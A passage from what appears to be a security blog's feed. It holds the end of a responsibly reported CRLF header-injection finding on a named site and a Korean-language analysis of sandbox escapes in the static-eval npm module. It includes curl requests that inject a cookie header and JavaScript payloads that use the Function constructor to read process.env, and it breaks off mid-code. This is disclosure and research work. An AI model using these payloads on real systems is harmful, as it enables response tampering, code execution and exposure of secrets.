class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">ubuntu@rwx:~$ curl -v https://a.d-cd.net/path?</span><br><span class="line">* Using HTTP2, server supports multi-use</span><br><span class="line">* Connection state changed (HTTP/2 confirmed)</span><br><span class="line">* Copying HTTP/2 data in stream buffer to connection buffer after upgrade: len=0</span><br><span class="line">* Using Stream ID: 1 (easy handle 0x55600336c580)</span><br><span class="line">&gt; GET /path? HTTP/2</span><br><span class="line">&gt; Host: a.d-cd.net</span><br><span class="line">&gt; User-Agent: curl/7.58.0</span><br><span class="line">&gt; Accept: */*</span><br><span class="line">&gt; </span><br><span class="line">* Connection state changed (MAX_CONCURRENT_STREAMS updated)!</span><br><span class="line">&lt; HTTP/2 301 </span><br><span class="line">&lt; server: nginx</span><br><span class="line">&lt; date: Tue, 28 Jan 2020 19:23:20 GMT</span><br><span class="line">&lt; content-type: text/html</span><br><span class="line">&lt; content-length: 162</span><br><span class="line">&lt; location: https://a.d-cd.net/path</span><br><span class="line">&lt; x-clacks-overhead: GNU Terry Pratchett</span><br><span class="line">&lt; x-content-type-options: nosniff</span><br><span class="line">&lt; strict-transport-security: max-age=31622400</span><br><span class="line">&lt; </span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span><span class="tag">&lt;<span class="name">title</span>&gt;</span>301 Moved Permanently<span class="tag">&lt;/<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">center</span>&gt;</span><span class="tag">&lt;<span class="name">h1</span>&gt;</span>301 Moved Permanently<span class="tag">&lt;/<span class="name">h1</span>&gt;</span><span class="tag">&lt;/<span class="name">center</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">hr</span>&gt;</span><span class="tag">&lt;<span class="name">center</span>&gt;</span>nginx<span class="tag">&lt;/<span class="name">center</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line">* Connection #0 to host a.d-cd.net left intact</span><br></pre></td></tr></table></figure><p>Scanning the server, I noticed something unusual.<br> Regardless of the content, If URL <code>?a=b (search)</code> part exists, server remove it and make us redirect again.<br> I think it’s for caching, but I’m not sure.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://a.d-cd.net/ (301) -&gt; https://a.d-cd.net/ (404)</span><br><span class="line">https://a.d-cd.net/ (404)</span><br><span class="line">https://a.d-cd.net/? (301 redirect) -&gt; https://a.d-cd.net/ (404)</span><br></pre></td></tr></table></figure><p>simply, <code>http</code> request is redirected to <code>https</code>.<br> and <code>https</code> request that contains <code>?...</code> is redirected without <code>?......</code> part.<br> when the part of <code>?</code> is deleted, the part of <code>path</code> makes url decoded in response.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">ubuntu@rwx:~$ curl -v <span class="string">&#x27;https://a.d-cd.net/path%0aheader:%20value%0a?&#x27;</span></span><br><span class="line">&gt; GET /path%0aheader:%20value%0a? HTTP/2</span><br><span class="line">&gt; Host: a.d-cd.net</span><br><span class="line">&gt; User-Agent: curl/7.58.0</span><br><span class="line">&gt; Accept: */*</span><br><span class="line">&gt; </span><br><span class="line">* Connection state changed (MAX_CONCURRENT_STREAMS updated)!</span><br><span class="line">* http2 error: Invalid HTTP header field was received: frame <span class="built_in">type</span>: 1, stream: 1, name: [location], value: [https://a.d-cd.net/path</span><br><span class="line">header: value</span><br><span class="line">]</span><br><span class="line">* HTTP/2 stream 1 was not closed cleanly: PROTOCOL_ERROR (err 1)</span><br><span class="line">* Connection <span class="comment">#0 to host a.d-cd.net left intact</span></span><br><span class="line">curl: (92) HTTP/2 stream 1 was not closed cleanly: PROTOCOL_ERROR (err 1)</span><br></pre></td></tr></table></figure><p>I thought this would be available for <code>crlf injection</code>, but the h2 setting would allow meta-data verification.<br> Blocking was being performed by error when trying to <code>crlf injection</code>.<br> I don’t know if this is intended, but <code>h2</code> errors are preventing malicious headers from being inserted into the browser.</p><p><img src="/img/2020/01/%EC%BA%A1%EC%B2%98.gif" alt="img"></p><p>The above screen shows the occurrence of a <code>http2</code> error in the latest version of Chrome when you connect to the address <code>https://a.d-cd.net/%0aa%0a?</code> (browsers support <code>http2</code> causes the same as curl)</p><p>These errors can work as a mitigation, but It is not sufficient.<br> The browser prefers <code>http2</code> communication, but is server still support <code>http1.1</code> or earlier.<br> When a user connects to a server using a proxy does not support <code>http2</code>, the browsers will connects with <code>http1.1</code><br> so It may makes header injection plainly.</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">ubuntu@rwx:~$ curl -v --http1.1 &#x27;https://a.d-cd.net/path%0aset-cookie:%20evil=123123;%0acontent-length:%20306%0a?&#x27;</span><br><span class="line">&gt; GET /path%0aset-cookie:%20evil=123123;%0acontent-length:%20306%0a? HTTP/1.1</span><br><span class="line">&gt; Host: a.d-cd.net</span><br><span class="line">&gt; User-Agent: curl/7.58.0</span><br><span class="line">&gt; Accept: */*</span><br><span class="line">&gt; </span><br><span class="line">&lt; HTTP/1.1 301 Moved Permanently</span><br><span class="line">&lt; Server: nginx</span><br><span class="line">&lt; Date: Tue, 28 Jan 2020 19:34:16 GMT</span><br><span class="line">&lt; Content-Type: text/html</span><br><span class="line">&lt; Content-Length: 162</span><br><span class="line">&lt; Location: https://a.d-cd.net/path</span><br><span class="line">&lt; set-cookie: evil=123123;</span><br><span class="line">&lt; content-length: 306</span><br><span class="line">&lt; </span><br><span class="line">Connection: keep-alive</span><br><span class="line">X-Clacks-Overhead: GNU Terry Pratchett</span><br><span class="line">X-Content-Type-Options: nosniff</span><br><span class="line">Strict-Transport-Security: max-age=31622400</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span><span class="tag">&lt;<span class="name">title</span>&gt;</span>301 Moved Permanently<span class="tag">&lt;/<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">center</span>&gt;</span><span class="tag">&lt;<span class="name">h1</span>&gt;</span>301 Moved Permanently<span class="tag">&lt;/<span class="name">h1</span>&gt;</span><span class="tag">&lt;/<span class="name">center</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">hr</span>&gt;</span><span class="tag">&lt;<span class="name">center</span>&gt;</span>nginx<span class="tag">&lt;/<span class="name">center</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line">* Connection #0 to host a.d-cd.net left intact</span><br></pre></td></tr></table></figure><p>For example, curl sends a request with the <code>http1.1</code> option.<br> You can verify that it is received with the set-cookie header without errors.</p><p>In conclusion, <code>crlf injection</code> is possible if the user uses a <code>proxy</code> or <code>browser</code> that does not support <code>http2 (ALPN)</code>.<br> Any header and content can be inserted into the response packet.</p><hr><ul><li>20&#x2F;01&#x2F;29 Reported</li><li>20&#x2F;01&#x2F;31 Patched</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;desciption&quot;&gt;&lt;a href=&quot;#desciption&quot; class=&quot;headerlink&quot; title=&quot;desciption&quot;&gt;&lt;/a&gt;desciption&lt;/h2&gt;&lt;figure class=&quot;highlight html&quot;&gt;&lt;table&gt;&lt;tr
      
    
    </summary>
    
    
      <category term="Docs" scheme="https://blog.p6.is/category/docs/"/>
    
    
      <category term="CRLF Injection" scheme="https://blog.p6.is/tags/CRLF-Injection/"/>
    
  </entry>
  
  <entry>
    <title>Bypassing a JS sandbox</title>
    <link href="https://blog.p6.is/bypassing-a-js-sandbox/"/>
    <id>https://blog.p6.is/bypassing-a-js-sandbox/</id>
    <published>2020-01-29T00:00:00.000Z</published>
    <updated>2022-10-14T13:04:25.645Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h2><p>컴퓨터 보안에 있어 <code>Sandbox</code> 는 프로그래밍 언어에서 작동중인 프로그램의 <code>Context</code> 를 분리하는 매커니즘으로 운영체제에 대한 접근을 제어하거나, 검증 않은 코드 또는 신뢰할 수 없는 프로그램을 실행할 때 종종 사용됩니다.</p><p>이러한 <code>Sandbox</code> 개념은 <code>NodeJS</code> 에서도 존재하는데, <code>V8</code> 엔진을 기반으로 하여 동작하는 <code>NodeJS</code> 에서는 여타의 언어와는 조금 다른 방식으로 구현되고는 합니다. 코드를 파싱하여 작업을 분배해주는 Event Loop 방식을 사용하고 있기 때문에, 효율적인 자원 관리를 위해 프로세스 격리를 기반으로 하는 것보다는 자바스크립트 네이티브에서 지원하는 <code>Proxy</code> 를 사용한 문맥 기반 제어, 또는 <code>AST</code> 를 기반으로 문법적인 제약을 두는 방법이 주로 쓰입니다.</p><p><code>static-eval</code> 은 <code>esprima</code> 라이브러리를 사용하며, 자바스크립트를 <code>AST (Abstract Syntax Tree)</code> 로 변환하고 생성된 <code>AST</code> 를 기반으로 샌드박스 내에서 전역 객체로 지정할 수 있는 객체가 별도 지정, 주어진 표현식을 <code>wrapping</code>하여 <code>Evaluation</code> 합니다.</p><p><code>Ecma2015</code>의 <code>Proxy</code> 객체를 통해 구현되는 <code>Sandbox</code> 기법과 다르게, 동작 전체가 <code>AST</code> 를 기반으로 행해지기에, <code>parser</code> 역할을 수행하는 <code>esprima</code> 가 지원하지 않는 문법에는 적용이 불가능하다는 단점이 있지만, 의도하지 않은 동작 발생을 보다 확실히 억제할 수 있습니다.</p><p><code>static-eval</code> 모듈은 19년 12월을 기준으로 6447만 다운로드를 기록하였습니다.</p><hr><h2 id="Precedent"><a href="#Precedent" class="headerlink" title="Precedent"></a>Precedent</h2><ul><li>Oct, 2017 (<a href="https://maustin.net/articles/2017-10/static_eval">matt austin</a>)</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&quot;</span>.<span class="property">sub</span>.<span class="title function_">constructor</span>(<span class="params"><span class="string">&quot;console.log(process.env)&quot;</span></span>)(<span class="params"></span>)</span><br></pre></td></tr></table></figure><p>구식의 Sandbox Escape 구문 중의 하나 입니다.</p><p>함수 생성자를 호출하여 익명 함수를 생성함으로써 문맥 탈출이 가능합니다.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (node.<span class="property">type</span> === <span class="string">&#x27;MemberExpression&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> obj = <span class="title function_">walk</span>(node.<span class="property">object</span>);</span><br><span class="line">    <span class="keyword">if</span> (obj === <span class="variable constant_">FAIL</span>) <span class="keyword">return</span> <span class="variable constant_">FAIL</span>;</span><br><span class="line">    <span class="comment">// do not allow access to methods on Function </span></span><br><span class="line">    <span class="keyword">if</span>((obj === <span class="variable constant_">FAIL</span>) || (<span class="keyword">typeof</span> obj == <span class="string">&#x27;function&#x27;</span>))&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable constant_">FAIL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure><p><code>Vendor</code> 에서는 패치로서 <code>MemberExpression</code> 대상 객체의 타입이 함수일 경우<br>  빈 객체를 반환하도록 수정 하였습니다.</p><ul><li>Feb, 2019 (<a href="https://licenciaparahackear.github.io/en/posts/static-eval-sandbox-escape-original-writeup/">Matías Lang</a>)</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="keyword">function</span>(<span class="params">&#123;book&#125;</span>)&#123;<span class="keyword">return</span> book.<span class="property">constructor</span>&#125;)(&#123;<span class="attr">book</span>:<span class="string">&quot;&quot;</span>.<span class="property">sub</span>&#125;)(<span class="string">&quot;console.log(process.env)&quot;</span>)()</span><br></pre></td></tr></table></figure><p>인자 참조를 함수를 통해 수행함으로서 <code>MemberExpression</code> 에 대한 필터링을 우회하는 방법입니다.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (node.<span class="property">type</span> === <span class="string">&#x27;FunctionExpression&#x27;</span>) &#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; node.<span class="property">params</span>.<span class="property">length</span>; i++)&#123;</span><br><span class="line">    <span class="keyword">var</span> key = node.<span class="property">params</span>[i];</span><br><span class="line">    <span class="keyword">if</span> (key.<span class="property">type</span> == <span class="string">&#x27;Identifier&#x27;</span>)&#123;</span><br><span class="line">        vars[key.<span class="property">name</span>] = <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">return</span> <span class="variable constant_">FAIL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>Vendor</code> 에서는 <code>FunctionExpression</code> 의 parameter key 값에 대응하는<br>  가상 전역 객체에 <code>null</code> 을 대입하도록 수정 하였습니다.</p><hr><h2 id="Static-analyze"><a href="#Static-analyze" class="headerlink" title="Static analyze"></a>Static analyze</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> evaluate = <span class="built_in">require</span>(<span class="string">&#x27;static-eval&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> parse = <span class="built_in">require</span>(<span class="string">&#x27;esprima&#x27;</span>).<span class="property">parse</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> src = <span class="string">&#x27;[1,2,3+4*10+n,foo(3+5),obj[&quot;&quot;+&quot;x&quot;].y]&#x27;</span>;</span><br><span class="line"><span class="keyword">var</span> ast = <span class="title function_">parse</span>(src).<span class="property">body</span>[<span class="number">0</span>].<span class="property">expression</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(evaluate(ast, &#123;</span><br><span class="line">    <span class="attr">n</span>: <span class="number">6</span>,</span><br><span class="line">    <span class="attr">foo</span>: <span class="keyword">function</span> (<span class="params">x</span>) &#123; <span class="keyword">return</span> x * <span class="number">100</span> &#125;,</span><br><span class="line">    <span class="attr">obj</span>: &#123; <span class="attr">x</span>: &#123; <span class="attr">y</span>: <span class="number">555</span> &#125; &#125;</span><br><span class="line">&#125;));</span><br></pre></td></tr></table></figure><p>기본적인 <code>static-eval</code> 모듈의 사용법은 위와 같습니다.<br> 파라미터로<code>AST</code> 와 가상 전역 객체를 전달함으로서 비교적 안전하게 수식을 계산할 수 있습니다.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = <span class="keyword">function</span> (<span class="params">ast, vars</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!vars) vars = &#123;&#125;;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable constant_">FAIL</span> = &#123;&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> result = (<span class="keyword">function</span> <span class="title function_">walk</span> (node, scopeVars) &#123;</span><br><span class="line">        ...</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (node.<span class="property">type</span> === <span class="string">&#x27;Identifier&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (&#123;&#125;.<span class="property">hasOwnProperty</span>.<span class="title function_">call</span>(vars, node.<span class="property">name</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> vars[node.<span class="property">name</span>];</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">return</span> <span class="variable constant_">FAIL</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><code>esprima</code>를 통해 생성된 <code>AST</code> 는 변수에 해당하는 <code>Identifier</code> 의 값은<br> 가상 전역 객체를 참조하여 반환하도록 합니다.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (node.<span class="property">type</span> === <span class="string">&#x27;MemberExpression&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> obj = <span class="title function_">walk</span>(node.<span class="property">object</span>);</span><br><span class="line">    <span class="comment">// do not allow access to methods on Function </span></span><br><span class="line">    <span class="keyword">if</span>((obj === <span class="variable constant_">FAIL</span>) || (<span class="keyword">typeof</span> obj == <span class="string">&#x27;function&#x27;</span>))&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable constant_">FAIL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (node.<span class="property">property</span>.<span class="property">type</span> === <span class="string">&#x27;Identifier&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> obj[node.<span class="property">property</span>.<span class="property">name</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> prop = <span class="title function_">walk</span>(node.<span class="property">property</span>);</span><br><span class="line">    <span class="keyword">if</span> (prop === <span class="variable constant_">FAIL</span>) <span class="keyword">return</span> <span class="variable constant_">FAIL</span>;</span><br><span class="line">    <span class="keyword">return</span> obj[prop];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>MemberExpression</code> 에서는 부모 객체가 함수 형태일 경우, 빈 객체를 반환하도록 합니다.<br> 함수 인스턴스 내부의 속성을 참조할 수 없으므로, 함수 생성자 참조가 불가능해집니다.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> unparse = <span class="built_in">require</span>(<span class="string">&#x27;escodegen&#x27;</span>).<span class="property">generate</span>;</span><br><span class="line">...</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (node.<span class="property">type</span> === <span class="string">&#x27;FunctionExpression&#x27;</span>) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> bodies = node.<span class="property">body</span>.<span class="property">body</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Create a &quot;scope&quot; for our arguments</span></span><br><span class="line">    <span class="keyword">var</span> oldVars = &#123;&#125;;</span><br><span class="line">    <span class="title class_">Object</span>.<span class="title function_">keys</span>(vars).<span class="title function_">forEach</span>(<span class="keyword">function</span>(<span class="params">element</span>)&#123;</span><br><span class="line">        oldVars[element] = vars[element];</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; node.<span class="property">params</span>.<span class="property">length</span>; i++)&#123;</span><br><span class="line">        <span class="keyword">var</span> key = node.<span class="property">params</span>[i];</span><br><span class="line">        <span class="keyword">if</span>(key.<span class="property">type</span> == <span class="string">&#x27;Identifier&#x27;</span>)&#123;</span><br><span class="line">            vars[key.<span class="property">name</span>] = <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">return</span> <span class="variable constant_">FAIL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i <span class="keyword">in</span> bodies)&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_">walk</span>(bodies[i]) === <span class="variable constant_">FAIL</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable constant_">FAIL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// restore the vars and scope after we walk</span></span><br><span class="line">    vars = oldVars;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> keys = <span class="title class_">Object</span>.<span class="title function_">keys</span>(vars);</span><br><span class="line">    <span class="keyword">var</span> vals = keys.<span class="title function_">map</span>(<span class="keyword">function</span>(<span class="params">key</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> vars[key];</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="keyword">return</span> <span class="title class_">Function</span>(keys.<span class="title function_">join</span>(<span class="string">&#x27;, &#x27;</span>), <span class="string">&#x27;return &#x27;</span> + <span class="title function_">unparse</span>(node)).<span class="title function_">apply</span>(<span class="literal">null</span>, vals);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>FunctionExpression</code> 는 <code>static-eval</code> 에서 함수 생성자를 사용하고 있는 유일한 부분입니다.<br> <code>escodegen</code> 라이브러리의 함수를 사용해 <code>AST</code> 의 <code>child tree</code> 를 인자로 받아 함수로 만들어 주며<br> 생성된 함수의 호출은 <code>CallExpression</code> 을 통해 가능합니다.</p><hr><h2 id="Prototype-Pollution-in-static-eval"><a href="#Prototype-Pollution-in-static-eval" class="headerlink" title="Prototype Pollution in static-eval"></a>Prototype Pollution in static-eval</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (node.<span class="property">type</span> === <span class="string">&#x27;MemberExpression&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> obj = <span class="title function_">walk</span>(node.<span class="property">object</span>);</span><br><span class="line">    <span class="comment">// do not allow access to methods on Function </span></span><br><span class="line">    <span class="keyword">if</span>((obj === <span class="variable constant_">FAIL</span>) || (<span class="keyword">typeof</span> obj == <span class="string">&#x27;function&#x27;</span>))&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable constant_">FAIL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (node.<span class="property">property</span>.<span class="property">type</span> === <span class="string">&#x27;Identifier&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> obj[node.<span class="property">property</span>.<span class="property">name</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> prop = <span class="title function_">walk</span>(node.<span class="property">property</span>);</span><br><span class="line">    <span class="keyword">if</span> (prop === <span class="variable constant_">FAIL</span>) <span class="keyword">return</span> <span class="variable constant_">FAIL</span>;</span><br><span class="line">    <span class="keyword">return</span> obj[prop];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (node.<span class="property">type</span> === <span class="string">&#x27;FunctionExpression&#x27;</span>) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> bodies = node.<span class="property">body</span>.<span class="property">body</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Create a &quot;scope&quot; for our arguments</span></span><br><span class="line">    <span class="keyword">var</span> oldVars = &#123;&#125;;</span><br><span class="line">    <span class="title class_">Object</span>.<span class="title function_">keys</span>(vars).<span class="title function_">forEach</span>(<span class="keyword">function</span>(<span class="params">element</span>)&#123;</span><br><span class="line">        oldVars[element] = vars[element];</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>; i&lt;node.<span class="property">params</span>.<span class="property">length</span>; i++)&#123;</span><br><span class="line">        <span class="keyword">var</span> key = node.<span class="property">params</span>[i];</span><br><span class="line">        <span class="keyword">if</span>(key.<span class="property">type</span> == <span class="string">&#x27;Identifier&#x27;</span>)&#123;</span><br><span class="line">            vars[key.<span class="property">name</span>] = <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">return</span> <span class="variable constant_">FAIL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i <span class="keyword">in</span> bodies)&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_">walk</span>(bodies[i]) === <span class="variable constant_">FAIL</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable constant_">FAIL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// restore the vars and scope after we walk</span></span><br><span class="line">    vars = oldVars;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> keys = <span class="title class_">Object</span>.<span class="title function_">keys</span>(vars);</span><br><span class="line">    <span class="keyword">var</span> vals = keys.<span class="title function_">map</span>(<span class="keyword">function</span>(<span class="params">key</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> vars[key];</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="keyword">return</span> <span class="title class_">Function</span>(keys.<span class="title function_">join</span>(<span class="string">&#x27;, &#x27;</span>), <span class="string">&#x27;return &#x27;</span> + <span class="title function_">unparse</span>(node)).<span class="title function_">apply</span>(<span class="literal">null</span>, vals);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// (&#123;&#125;).constructor</span></span><br><span class="line">ƒ <span class="title class_">Object</span>() &#123; [native code] &#125;</span><br><span class="line"><span class="comment">// 